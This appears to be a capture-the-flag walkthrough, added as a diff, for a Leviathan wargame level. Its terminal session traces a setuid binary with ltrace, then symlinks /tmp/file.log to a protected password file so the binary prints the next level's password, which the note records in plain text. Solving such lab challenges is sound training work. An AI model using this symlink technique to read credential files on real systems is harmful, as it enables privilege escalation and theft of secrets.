@@ -1,0 +1,30 @@
+szo7HDB88w for Leviathan6
+
+leviathan5@gibson:~$ ls -a
+.  ..  .bash_logout  .bashrc  leviathan5  .profile
+leviathan5@gibson:~$ ./leviathan5 
+Cannot find /tmp/file.log
+leviathan5@gibson:~$ ls -la
+total 36
+drwxr-xr-x  2 root       root        4096 Jun 20 04:07 .
+drwxr-xr-x 83 root       root        4096 Jun 20 04:08 ..
+-rw-r--r--  1 root       root         220 Mar 31 08:41 .bash_logout
+-rw-r--r--  1 root       root        3771 Mar 31 08:41 .bashrc
+-r-sr-x---  1 leviathan6 leviathan5 15140 Jun 20 04:07 leviathan5
+-rw-r--r--  1 root       root         807 Mar 31 08:41 .profile
+leviathan5@gibson:~$ ltrace ./leviathan5 
+__libc_start_main(0x804910d, 1, 0xffffd484, 0 <unfinished ...>
+fopen("/tmp/file.log", "r")                                                             = 0
+puts("Cannot find /tmp/file.log"Cannot find /tmp/file.log
+)                                                       = 26
+exit(-1 <no return ...>
++++ exited (status 255) +++
+leviathan5@gibson:~$ cd /tmp/
+leviathan5@gibson:/tmp$ cd ..
+leviathan5@gibson:/$ cd ~
+leviathan5@gibson:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
+leviathan5@gibson:~$ ./leviathan5 
+szo7HDB88w
+leviathan5@gibson:~$ 
+
+symlink is being used very often
